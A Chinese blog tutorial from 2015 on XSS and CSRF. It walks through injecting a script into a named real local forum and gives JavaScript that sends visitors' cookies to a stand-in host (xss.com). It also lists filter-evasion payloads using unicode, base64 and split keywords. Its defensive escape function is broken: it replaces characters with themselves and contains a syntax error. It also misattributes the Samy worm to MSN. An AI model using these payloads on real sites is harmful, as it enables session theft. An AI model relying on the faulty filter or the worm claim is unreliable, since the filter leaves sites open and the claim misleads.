title: 网站安全之ｘｓｓ／ｃｒｓｆ
id: 328
categories:
  - 安全
date: 2015-11-13 16:42:54
tags:
---

## XSS脚本攻击

XSS是什么？它的全名是：Cross-site scripting，为了和CSS层叠样式表区分，所以取名XSS。它是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML标签以及用户端脚本语言。

### 　　名城苏州网站注入

XSS注入常见的重灾区是社交网站和论坛，越是让用户自由输入内容的地方，我们就越要关注其能否抵御XSS攻击。XSS注入的攻击原理很简单，构造一些非法的url地址或js脚本让HTML标签溢出，从而造成注入。一般引诱用户点击才触发的漏洞我们称为反射性漏洞，用户打开页面就触发的称为注入型漏洞，当然注入型漏洞的危害更大一些。下面先用一个简单的实例来说明XSS注入无处不在。

名城苏州（www.2500sz.com)，是苏州本地门户网站，日均的pv数也达到了150万，它的论坛用户数很多，是本地化新闻、社区论坛做的比较成功的一个网站。

接下来我们将演示一个注入到2500sz.com的案例，我们先注册成一个2500sz.com站点会员，进入论坛板块，开始发布新帖。打开发帖页面，在web[编辑器](http://cpro.baidu.com/cpro/ui/uijs.php?adclass=0&amp;app_id=0&amp;c=news&amp;cf=1001&amp;ch=0&amp;di=128&amp;fv=0&amp;is_app=0&amp;jk=95c351b31afbdc06&amp;k=%B1%E0%BC%AD%C6%F7&amp;k0=%B1%E0%BC%AD%C6%F7&amp;kdi0=0&amp;luki=3&amp;n=10&amp;p=baidu&amp;q=06011078_cpr&amp;rb=0&amp;rs=1&amp;seller_id=1&amp;sid=6dcfb1ab351c395&amp;ssp2=1&amp;stid=0&amp;t=tpclicked3_hc&amp;td=1922429&amp;tu=u1922429&amp;u=http%3A%2F%2Fwww%2Eadmin10000%2Ecom%2Fdocument%2F4182%2Ehtml&amp;urlid=0)中输入如下内容：

![](http://www.admin10000.com/UploadFiles/Document/201404/07/20140407092037854689.JPG)

上面的代码即为分享一个网络图片，我们在图片的src属性中直接写入了[javascript](http://cpro.baidu.com/cpro/ui/uijs.php?adclass=0&amp;app_id=0&amp;c=news&amp;cf=1001&amp;ch=0&amp;di=128&amp;fv=0&amp;is_app=0&amp;jk=95c351b31afbdc06&amp;k=javascript&amp;k0=javascript&amp;kdi0=0&amp;luki=4&amp;n=10&amp;p=baidu&amp;q=06011078_cpr&amp;rb=0&amp;rs=1&amp;seller_id=1&amp;sid=6dcfb1ab351c395&amp;ssp2=1&amp;stid=0&amp;t=tpclicked3_hc&amp;td=1922429&amp;tu=u1922429&amp;u=http%3A%2F%2Fwww%2Eadmin10000%2Ecom%2Fdocument%2F4182%2Ehtml&amp;urlid=0):alert('xss');，操作成功后生成帖子，用IE6、7的用户打开此帖子就会出现下图的alert('xss')弹窗。

![](http://www.admin10000.com/UploadFiles/Document/201404/07/20140407092037002853.JPG)

当然我们要将标题设计的非常夺人眼球，比如“Pm2.5雾霾真相披露” ，然后将里面的alert换成如下恶意代码：
<pre>location.href='http://www.xss.com?cookie='+document.cookie；</pre>
这样我们就获取到了用户cookie的值，如果服务端session设置过期很长的话，以后就可以伪造这个用户的身份成功登录而不再需要用户名密码，关于session和cookie的关系我们在下一节中将会详细讲到。这里的location.href只是出于简单，如果做了跳转这个帖子很快会被管理员删除，但我们写如下代码，并且帖子的内容也是真实的，那么就会祸害很多人：
<pre>var img = document.createElement('img');
img.src='http://www.xss.com?cookie='+document.cookie;
img.style.display='none';
document.getElementsByTagName('body')[0].appendChild(img);</pre>
这样就神不知鬼不觉的把当前用户cookie的值发送到恶意站点，恶意站点通过GET参数，就能获取用户cookie的值。通过这个方法可以拿到用户各种各样的私密数据。

### 　　Ajax的XSS注入

另一处容易造成XSS注入的地方是Ajax的不正确使用。

比如有这样的一个场景，在一篇博文的详细页，很多用户给这篇博文留言，为了加快页面加载速度，项目经理要求先显示博文的内容，然后通过Ajax去获取留言的第一页信息，留言功能通过Ajax分页保证了页面的无刷新和快速加载，此做法的好处有：

（1）加快了博文详细页的加载，提升了用户体验，因为留言信息往往有用户头像、昵称、id等等，需要多表查询，且一般用户会先看博文，再拉下去看留言，这时留言已加载完毕。

（2）Ajax的留言分页能更快速响应，用户不必每次分页都让博文重新刷新。

于是前端工程师从PHP那获取了json数据之后，将数据放入DOM文档中，大家能看出下面代码的问题吗？
<pre>var commentObj = $('#comment');
$.get('/getcomment', {r:Math.random(),page:1,article_id:1234},function(data){
    //通过Ajax获取评论内容，然后将品论的内容一起加载到页面中
    if(data.state !== 200)  return commentObj.html('留言加载失败。')
    commentObj.html(data.content);
},'json');</pre>
我们设计的初衷是，PHP程序员将留言内容套入模板，返回json格式数据，示例如下：
<pre>{"state":200, "content":"模板的字符串片段"}</pre>
如果没有看出问题，大家可以打开firebug或者chrome的开发人员工具，直接把下面代码粘贴到有JQuery插件的网站中运行：
<pre>$('div:first').html('&lt;div&gt;&lt;script&gt;alert("xss")&lt;/script&gt;&lt;div&gt;');</pre>
正常弹出了alert框，你可能觉得这比较小儿科。

如果PHP程序员已经转义了尖括号&lt;&gt;还有单双引号"'，那么上面的恶意代码会被漂亮的变成如下字符输出到留言内容中:
<pre>$('div:first').html('&lt;script&gt; alert("xss")&lt;/script&gt; ');</pre>
这里我们需要表扬一下PHP程序员，可以将一些常规的XSS注入都屏蔽掉，但是在utf-8编码中，字符还有另一种表示方式，那就是unicode码，我们把上面的恶意字符串改写成如下：
<pre> $('div:first').html('
\u003c \u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c \u0065\u0072\u0074
\u0028 \u0022\u0078\u0073\u0073\u0022\u0029\u003c \u002f\u0073 \u0063\u0072\u0069\
u0070\u0074\u003e');</pre>
大家发现还是输出了alert框，只是这次需要将写好的恶意代码放入转码工具中做下转义，webqq曾经就爆出过上面这种unicode码的XSS注入漏洞，另外有很多反射型XSS漏洞因为过滤了单双引号，所以必须使用这种方式进行注入。

### 　　base64注入

除了比较老的ie6、7浏览器，一般浏览器在加载一些图片资源的时候我们可以使用base64编码显示指定图片，比如下面这段base64编码：
<pre>&lt;img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEU (... 省略若干字符) 
AAAASUVORK5CYII=" /&gt;</pre>
表示的就是一张Node.js官网的logo，图片如下：

![](http://www.admin10000.com/UploadFiles/Document/201404/07/20140407092037789767.PNG)

我们一般使用这样的技术把一些网站常用的logo或者小图标转存成为base64编码，进而减少一次客户端向[服务器](http://cpro.baidu.com/cpro/ui/uijs.php?adclass=0&amp;app_id=0&amp;c=news&amp;cf=1001&amp;ch=0&amp;di=128&amp;fv=0&amp;is_app=0&amp;jk=95c351b31afbdc06&amp;k=%B7%FE%CE%F1%C6%F7&amp;k0=%B7%FE%CE%F1%C6%F7&amp;kdi0=0&amp;luki=5&amp;n=10&amp;p=baidu&amp;q=06011078_cpr&amp;rb=0&amp;rs=1&amp;seller_id=1&amp;sid=6dcfb1ab351c395&amp;ssp2=1&amp;stid=0&amp;t=tpclicked3_hc&amp;td=1922429&amp;tu=u1922429&amp;u=http%3A%2F%2Fwww%2Eadmin10000%2Ecom%2Fdocument%2F4182%2Ehtml&amp;urlid=0)的请求，加快用户加载页面速度。

我们还可以把HTML页面的代码隐藏在data属性之中，比如下面的代码将打开一个hello world的新页面。
<pre>&lt;a href="data:text/html;ascii,&lt;html&gt;&lt;title&gt;hello&lt;/title&gt;&lt;body&gt;hello world
&lt;/body&gt;&lt;/html&gt;"&gt;click me&lt;/a&gt;</pre>
根据这样的特性，我们就可以尝试把一些恶意的代码转存成为base64编码格式，然后注入到a标签里去，从而形成反射型XSS漏洞，我们编码如下代码。
<pre>&lt;img src=x onerror=alert(1)&gt;</pre>
经过base64编码之后的恶意代码如下。
<pre>&lt;a href="data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="&gt;base64 xss&lt;/a&gt;</pre>
用户在点击这个超链接之后，就会执行如上的恶意alert弹窗，就算网站开发者过滤了单双引号",'和左右尖括号&lt;&gt;，注入还是能够生效的。

不过这样的注入因为跨域的问题，恶意脚本是无法获取网站的cookie值。另外如果网站提供我们自定义flash路径，也是可以使用相同的方式进行注入的，下面是一段规范的在网页中插入flash的代码：
<pre>&lt;object type="application/x-shockwave-flash" data="movie.swf" width="400" height="300"&gt;
&lt;param name="movie" value="movie.swf" /&gt;
&lt;/object&gt;</pre>
把data属性改写成如下恶意内容，也能够通过base64编码进行注入攻击：
<pre>&lt;script&gt;alert("Hello");&lt;/script&gt;</pre>
经过编码过后的注入内容：
<pre>&lt;object data="data:text/html;base64, PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="&gt;&lt;/object&gt;</pre>
用户在打开页面后，会弹出alert框，但是在chrome浏览器中是无法获取到用户cookie的值，因为chrome会认为这个操作不安全而禁止它，看来我们的浏览器为用户安全也做了不少的考虑。

### 　　常用注入方式

注入的根本目的就是要HTML标签溢出，从而执行攻击者的恶意代码，下面是一些常用攻击手段：

（1）alert(String.fromCharCode(88,83,83))，通过获取字母的ascii码来规避单双引号，这样就算网站过滤掉单双引号也还是可以成功注入的。

（2）&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;，通过注入img标签来达到攻击的目的，这个只对ie6和ie7下有效，意义不大。

（3）&lt;IMG SRC=""onerror="alert('xxs')"&gt;，如果能成功闭合img标签的src属性，那么加上onload或者onerror事件可以更简单的让用户遭受攻击。

（4）&lt;IMG SRC=[javascript](http://cpro.baidu.com/cpro/ui/uijs.php?adclass=0&amp;app_id=0&amp;c=news&amp;cf=1001&amp;ch=0&amp;di=128&amp;fv=0&amp;is_app=0&amp;jk=95c351b31afbdc06&amp;k=javascript&amp;k0=javascript&amp;kdi0=0&amp;luki=4&amp;n=10&amp;p=baidu&amp;q=06011078_cpr&amp;rb=0&amp;rs=1&amp;seller_id=1&amp;sid=6dcfb1ab351c395&amp;ssp2=1&amp;stid=0&amp;t=tpclicked3_hc&amp;td=1922429&amp;tu=u1922429&amp;u=http%3A%2F%2Fwww%2Eadmin10000%2Ecom%2Fdocument%2F4182%2Ehtml&amp;urlid=0):alert('XSS')&gt;，这种方式也只有对ie6奏效。

（5）&lt;IMG SRC="jav ascript:alert('XSS');"&gt;，&lt;IMG SRC=java\0script:alert(\"XSS\")&gt;，&lt;IMG SRC="jav ascript:alert('XSS');"&gt;，我们也可以把关键字Javascript分开写，避开一些简单的验证，这种方式ie6统统中招，所以ie6真不是安全的浏览器。

（6）&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"&gt;，通过样式表也能注入。

（7）&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE&gt;,如果可以自定义style样式，也可能被注入。

（8）&lt;IFRAME SRC="[javascript](http://cpro.baidu.com/cpro/ui/uijs.php?adclass=0&amp;app_id=0&amp;c=news&amp;cf=1001&amp;ch=0&amp;di=128&amp;fv=0&amp;is_app=0&amp;jk=95c351b31afbdc06&amp;k=javascript&amp;k0=javascript&amp;kdi0=0&amp;luki=4&amp;n=10&amp;p=baidu&amp;q=06011078_cpr&amp;rb=0&amp;rs=1&amp;seller_id=1&amp;sid=6dcfb1ab351c395&amp;ssp2=1&amp;stid=0&amp;t=tpclicked3_hc&amp;td=1922429&amp;tu=u1922429&amp;u=http%3A%2F%2Fwww%2Eadmin10000%2Ecom%2Fdocument%2F4182%2Ehtml&amp;urlid=0):alert('XSS');"&gt;&lt;/IFRAME&gt;，iframe的标签也可能被注入。

（9）&lt;a href="javasc ript:alert(1)"&gt;click&lt;/a&gt;，利用 伪装换行，:伪装冒号，从而避开对Javascript关键字以及冒号的过滤。

其实XSS注入过程充满智慧，只要你反复尝试各种技巧，就可能在网站的某处攻击成功。总之，发挥你的想象力去注入吧，最后别忘了提醒下站长哦。更多XSS注入方式参阅：(XSS Filter Evasion Cheat Sheet)[https://www.owasp.org/index.php/XSSFilterEvasionCheatSheet]

### 　　防范措施

对于防范XSS注入，其实只有两个字过滤，一定要对用户提交上来的数据保持怀疑，过滤掉其中可能注入的字符，这样才能保证应用的安全。另外，对于入库时过滤还是读库时过滤，这就需要根据应用的类型来进行选择了。下面是一个简单的过滤HTML标签的[函数](http://cpro.baidu.com/cpro/ui/uijs.php?adclass=0&amp;app_id=0&amp;c=news&amp;cf=1001&amp;ch=0&amp;di=128&amp;fv=0&amp;is_app=0&amp;jk=95c351b31afbdc06&amp;k=%BA%AF%CA%FD&amp;k0=%BA%AF%CA%FD&amp;kdi0=0&amp;luki=1&amp;n=10&amp;p=baidu&amp;q=06011078_cpr&amp;rb=0&amp;rs=1&amp;seller_id=1&amp;sid=6dcfb1ab351c395&amp;ssp2=1&amp;stid=0&amp;t=tpclicked3_hc&amp;td=1922429&amp;tu=u1922429&amp;u=http%3A%2F%2Fwww%2Eadmin10000%2Ecom%2Fdocument%2F4182%2Ehtml&amp;urlid=0)代码：
<pre>var escape = function(html){
  return String(html)
    .replace(/&amp;(?!\w+;)/g, '&amp;')
    .replace(/&lt;/g, '&lt;')
    .replace(/&gt;/g, '&gt;')
    .replace(/"/g, '"')
    .replace(/'/g, ''');
};</pre>
不过上述的过滤方法会把所有HTML标签都转义，如果我们的网站应用确实有自定义HMTL标签的需求的话，它就力不从心了。这里我推荐一个过滤XSS注入的模块，由本书另一位作者老雷提供：[js-xss](https://github.com/leizongmin/js-xss)

## 　CSRF请求伪造

CSRF是什么呢？CSRF全名是Cross-site request forgery，是一种对网站的恶意利用，CSRF比XSS更具危险性。

### 　　Session详解

想要深入理解CSRF攻击的特性，我们必须了解网站session的工作原理。

session我想大家都不会陌生，无论你用Node.js或PHP开发过网站的肯定都用过session对象，假如我把浏览器的cookie禁用了，大家认为session还能正常工作吗？

答案是否定的，我举个简单的例子来帮助大家理解session的含义。

比如我办了一张超市的储值会员卡，我能享受部分商品打折的优惠，我的个人资料以及卡内余额都是保存在超市会员数据库里的。每次结账时，出示会员卡超市便能知道我的身份，随即进行打折优惠并扣除卡内相应余额。

这里我们的会员卡卡号就相当于保存在cookie中的sessionid，而我的个人信息就是保存在服务端的session对象，因为cookie有两个重要特性，（1）同源性，保证了cookie不会跨域发送造成泄密；（2）附带性，保证每次请求服务端都会在请求头中带上cookie信息。也就是这两个特性为我们识别用户带来的便利，因为HTTP协议是无状态的，我们之所以知道请求用户的身份，其实就是获取了用户请求头中的cookie信息。

当然session对象的保存方法多种多样，可以保存在文件中，也可以是内存里。考虑到分布式的横向扩展，我们还是建议生产环境把它保存在第三方媒介中，比如redis或者mongodb，默认的express框架是将session对象保存在内存里的。

除了用cookie保存sessionid，我们还可以使用url参数来保存sessionid，只不过每次请求都需要在url里带上这个参数，根据这个参数，我们就能识别此次请求的用户身份了。

另外近阶段利用Etag来保存sessionid也被使用在用户行为跟踪上，Etag是静态资源[服务器](http://cpro.baidu.com/cpro/ui/uijs.php?adclass=0&amp;app_id=0&amp;c=news&amp;cf=1001&amp;ch=0&amp;di=128&amp;fv=0&amp;is_app=0&amp;jk=95c351b31afbdc06&amp;k=%B7%FE%CE%F1%C6%F7&amp;k0=%B7%FE%CE%F1%C6%F7&amp;kdi0=0&amp;luki=5&amp;n=10&amp;p=baidu&amp;q=06011078_cpr&amp;rb=0&amp;rs=1&amp;seller_id=1&amp;sid=6dcfb1ab351c395&amp;ssp2=1&amp;stid=0&amp;t=tpclicked3_hc&amp;td=1922429&amp;tu=u1922429&amp;u=http%3A%2F%2Fwww%2Eadmin10000%2Ecom%2Fdocument%2F4182%2Ehtml&amp;urlid=0)对用户请求头中if-none-match的响应，一般我们第一次请求某一个静态资源是不会带上任何关于缓存信息的请求头的，这时候静态资源服务器根据此资源的大小和最终修改时间，哈希计算出一个字符串作为Etag的值响应给客户端，如下图：

![](http://www.admin10000.com/UploadFiles/Document/201404/07/20140407092037325038.PNG)

第二次当我们再访问这个静态资源的时候，由于本地浏览器具有此图片的缓存，但是不确定服务器是否已经更新掉了这个静态资源，所以在发起请求的时候会带上if-none-match参数，其值就是上次请求服务器响应的Etag值。服务器接收到这个if-none-match的值，再根据原算法去生成Etag值，进行比对。如果两个值相同，则说明该静态资源没有被更新，于是响应状态码304，告诉浏览器放心的使用本地缓存，远程资源没有更新，结果如下图：

![](http://www.admin10000.com/UploadFiles/Document/201404/07/20140407092037233874.PNG)

当然如果远程资源有变动，则[服务器](http://cpro.baidu.com/cpro/ui/uijs.php?adclass=0&amp;app_id=0&amp;c=news&amp;cf=1001&amp;ch=0&amp;di=128&amp;fv=0&amp;is_app=0&amp;jk=95c351b31afbdc06&amp;k=%B7%FE%CE%F1%C6%F7&amp;k0=%B7%FE%CE%F1%C6%F7&amp;kdi0=0&amp;luki=5&amp;n=10&amp;p=baidu&amp;q=06011078_cpr&amp;rb=0&amp;rs=1&amp;seller_id=1&amp;sid=6dcfb1ab351c395&amp;ssp2=1&amp;stid=0&amp;t=tpclicked3_hc&amp;td=1922429&amp;tu=u1922429&amp;u=http%3A%2F%2Fwww%2Eadmin10000%2Ecom%2Fdocument%2F4182%2Ehtml&amp;urlid=0)会响应一份新的资源给浏览器，并且Etag的值也会不同。根据这样的一个特性，我们可以得出结论，在用户第一次请求某一个静态资源的时候我们响应给它一个全局唯一的Etag值，在用户不清空缓存的情况下，用户下次再请求到服务器，还是会带上同一个Etag值的，于是我们可以利用这个值作为sessionid，而我们在服务器端保存这些Etag值和用户信息的对应关系，也就可以利用Etag来标识出用户身份了。

### 　　CSRF的危害性

在我们理解了session的工作机制后，CSRF攻击也就很容易理解了。CSRF攻击就相当于恶意用户复制了我的会员卡，用我的会员卡享受购物的优惠折扣，更可以使用我购物卡里的余额购买他的东西！

CSRF的危害性已经不言而喻了，恶意用户可以伪造某一个用户的身份给其好友发送垃圾信息，这些垃圾信息的超链接可能带有木马程序或者一些诈骗信息（比如借钱之类的）。如果发送的垃圾信息还带有蠕虫链接的话，接收到这些有害信息的好友一旦打开私信中的链接，就也成为了有害信息的散播者，这样数以万计的用户被窃取了资料、种植了木马。整个网站的应用就可能在短时间内瘫痪。

MSN网站，曾经被一个美国的19岁小伙子Samy利用css的background漏洞几小时内让100多万用户成功的感染了他的蠕虫，虽然这个蠕虫并没有破坏整个应用，只是在每一个用户的签名后面都增加了一句“Samy 是我的偶像”，但是一旦这些漏洞被恶意用户利用，后果将不堪设想。同样的事情也曾经发生在新浪微博上。

想要CSRF攻击成功，最简单的方式就是配合XSS注入，所以千万不要小看了XSS注入攻击带来的后果，不是alert一个对话框那么简单，XSS注入仅仅是第一步！